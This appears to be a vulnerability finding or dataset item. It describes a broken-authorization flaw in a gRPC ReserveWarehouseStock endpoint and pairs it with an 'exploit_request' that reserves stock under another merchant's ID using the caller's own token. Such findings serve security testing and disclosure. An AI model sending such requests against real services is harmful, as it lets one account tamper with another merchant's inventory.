diagnosis: The ReserveWarehouseStock RPC relies on the merchant_id supplied in the request protobuf instead of verifying that the authenticated gRPC peer identity corresponds to the specified merchant. A merchant can reserve warehouse inventory under another merchant's account, creating conflicting stock holds.
exploit_request:
GRPC /inventory.v1.InventoryService/ReserveWarehouseStock
Host: fulfillment-grpc.logistics.io:443
Metadata: authorization: Bearer merchant_token_abc

{"merchant_id": "m_target_corp", "sku": "SKU-9901", "quantity": 500}
